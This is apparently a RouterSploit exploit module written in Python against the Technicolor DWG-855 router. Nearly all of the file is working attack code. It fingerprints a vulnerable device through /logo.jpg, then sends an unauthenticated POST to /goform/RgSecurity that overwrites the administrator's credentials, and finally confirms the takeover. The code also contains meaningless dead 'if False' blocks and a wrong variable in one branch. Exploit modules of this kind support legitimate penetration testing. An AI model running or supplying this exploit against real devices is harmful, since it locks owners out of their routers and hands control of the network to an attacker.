from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Technicolor DWG-855 Auth Bypass', 'description': "Module exploits Technicolor DWG-855 Authentication Bypass vulnerability which allows changing administrator's password.\n\nNOTE: This module will errase previous credentials, this is NOT stealthy.", 'authors': ('JPaulMora <https://JPaulMora.GitHub.io>', '0BuRner'), 'references': ('Bug discovered some time before Aug 2016, this is the first reference to it!\nThis exploit works with any POST parameter, but changing admin creds gives you access to everything else.',), 'devices': ('Technicolor DWG-855',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')
    nuser = OptString('ruser', 'New user (overwrites existing user)')
    npass = OptString('rpass', 'New password (overwrites existing password)')

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        if self.check():
            print_success('Target is vulnerable')
            print_status('Changing', self.target, 'credentials to', self.nuser, ':', self.npass)
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'HttpUserId': self.nuser, 'Password': self.npass, 'PasswordReEnter': self.npass, 'RestoreFactoryNo': '0x00'}
            response = self.http_request(method='POST', path='/goform/RgSecurity', headers=headers, data=data)
            if response is None:
                print_error('Target did not answer request.')
            elif response.status_code == 401:
                check_response = self.http_request(method='GET', path='/RgSwInfo.asp', auth=(self.nuser, self.npass))
                if check_response.status_code == 200:
                    print_success('Credentials changed!')
                elif response.status_code == 401:
                    print_error('Target answered, denied access.')
                else:
                    pass
            else:
                print_error('Unknown error.')
        else:
            print_error('Exploit failed - Target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        vulnresp = '\x11Ducky\x00'
        response = self.http_request(method='GET', path='/logo.jpg', auth=('', ''))
        if response is not None and vulnresp in response.text:
            return True
        else:
            return False